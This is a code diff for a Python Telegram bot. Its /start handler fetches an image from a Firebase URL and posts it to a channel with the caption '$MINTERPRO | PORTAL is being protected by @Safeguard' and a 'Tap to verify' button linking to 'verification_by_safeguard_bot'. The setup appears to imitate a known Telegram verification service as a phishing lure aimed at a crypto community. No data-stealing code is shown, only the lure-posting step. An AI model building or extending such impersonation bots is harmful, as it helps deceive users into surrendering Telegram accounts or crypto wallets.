@@ -7,6 +7,7 @@ import aiohttp  # Asynchronous HTTP requests
 from dotenv import load_dotenv
 import os
 from aiohttp import web  # For the HTTP server
+from io import BytesIO
 
 # Load environment variables from the .env file
 load_dotenv()
@@ -94,17 +95,39 @@ async def on_verify_button_click(event):
 @portal_bot_client.on(events.NewMessage(pattern='/start'))
 async def on_portal_access(event):
     try:
-        print("Start command received.")
-        channel_id = '-1002486862799'  # Replace with actual channel ID
-        message = "$MINTERPRO | PORTAL is being protected by @Safeguard\n\nClick below to verify you're human"
-        await portal_bot_client.send_message(
-            entity=channel_id,
-            message=message,
-            buttons=[Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
-        )
-        print("Message sent successfully.")
+        # Define your channel ID
+        channel_id = '-1002486862799'  # Replace with your actual channel ID
+        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'
+
+        # Download the image from the URL
+        async with aiohttp.ClientSession() as session:
+            async with session.get(image_url) as response:
+                if response.status == 200:
+                    print("Image fetched successfully.")
+                    image_data = BytesIO(await response.read())  # Convert the content into a file-like object
+                    image_data.name = 'image_verify_portal.jpg'  # Set a name for the file
+
+                    # Upload the photo
+                    uploaded_photo = await portal_bot_client.upload_file(image_data)
+
+                    # Send the message to the channel
+                    await portal_bot_client.send_file(
+                        entity=channel_id,
+                        file=uploaded_photo,
+                        caption=(
+                            "$MINTERPRO | PORTAL is being protected by @Safeguard\n\n"
+                            "Click below to verify you're human"
+                        ),
+                        buttons=[
+                            [Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
+                        ]
+                    )
+                    print("Message sent successfully.")
+                else:
+                    print(f"Failed to fetch the image. HTTP Status: {response.status}")
     except Exception as e:
         print(f"Error: {e}")
+
 
 
 # HTTP Server for health checks
